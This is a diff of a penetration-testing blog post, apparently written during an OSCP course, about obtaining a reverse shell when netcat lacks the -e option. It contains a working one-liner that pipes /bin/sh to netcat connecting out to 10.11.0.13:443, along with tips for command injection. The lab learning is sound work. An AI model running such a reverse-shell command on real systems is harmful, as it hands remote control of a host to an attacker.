@@ -16,7 +16,7 @@ Recently in my OSCP course, I was struggeling a few hours to get a reversed shel
      class="media pull-right img-thumbnail">
 I immediately found that netcat was installed, but ofcourse [without the e-option](https://www.google.nl/search?q=netcat+GAPING_SECURITY_HOLE). All references to netcat without -e suggest you use  After trying harder for many many many tries, I finally came up with the following solution.
 
-1. Use `tail -f` to feed commands from a temporary file to bash. (Using `-n 0` to ignore any current content of the temporary file.)
+1. Use "tail -f" to feed commands from a temporary file to bash. (Using "-n 0" to ignore any current content of the temporary file.)
 2. Redirect the output of the shell command to netcat.
 3. Redirect the output of netcat to the temporary file, so the tail command picks it up...
 
@@ -43,7 +43,7 @@ mkfifo pipe; nc -nv 10.11.0.13 443 < pipe | /bin/sh 2>pipe >pipe
 ```
 
 To wrap up, which things slowed me down finding a way to obtain a reverse shell?
-1. Not understanding the `mkfifo pipe` command. This command makes a pipe in the _current_ directory. So not having any rights there, just really does not help...
+1. Not understanding the "mkfifo pipe" command. This command makes a pipe in the _current_ directory. So not having any rights there, just really does not help...
 2. Forgetting that the & character should be url encoded _and_ not by using &amp;. This made me lose the stderr output, that just really does not help either...
-3. When `uname -a` gives back "FreeBSD ... amd64" you probably should not try your Linux/x86 binaries. Oke, but where/how do I get a FreeBSD/amd64 payload?
-4. Oh, and last: `chmod +x` did not work, `chmod 777` did the job... (◔_◔)
+3. When "uname -a" gives back "FreeBSD ... amd64" you probably should not try your Linux/x86 binaries. Oke, but where/how do I get a FreeBSD/amd64 payload?
+4. Oh, and last: "chmod +x" did not work, "chmod 777" did the job... (◔_◔)
